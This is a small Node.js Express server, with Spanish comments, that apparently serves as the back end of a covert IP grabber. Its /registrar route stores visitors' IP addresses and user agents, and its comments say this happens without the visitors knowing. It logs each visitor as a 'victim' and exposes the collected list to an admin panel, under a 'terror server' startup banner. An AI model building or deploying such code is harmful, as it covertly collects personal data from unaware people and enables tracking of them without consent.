const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Guardar IPs detectadas
let ipsDetectadas = [];

// Ruta para que los visitantes reporten su IP (sin que lo sepan)
app.post('/registrar', (req, res) => {
    const { ip, userAgent } = req.body;
    const registro = {
        ip: ip,
        userAgent: userAgent,
        timestamp: new Date().toLocaleString(),
        id: Date.now()
    };
    ipsDetectadas.unshift(registro);
    console.log(`[R2D2] Nueva víctima: ${ip}`);
    res.json({ status: 'oculto' });
});

// Ruta para que R2D2 obtenga las IPs
app.get('/api/ips', (req, res) => {
    res.json(ipsDetectadas);
});

// Ruta para limpiar (opcional)
app.delete('/api/limpiar', (req, res) => {
    ipsDetectadas = [];
    res.json({ status: 'limpiado' });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════╗
    ║   👁️  SERVIDOR TERROR ACTIVADO  👁️   ║
    ╠══════════════════════════════════════╣
    ║  Visitantes: http://localhost:3000   ║
    ║  Panel R2D2: http://localhost:3000/admin.html ║
    ╚══════════════════════════════════════╝
    `);
});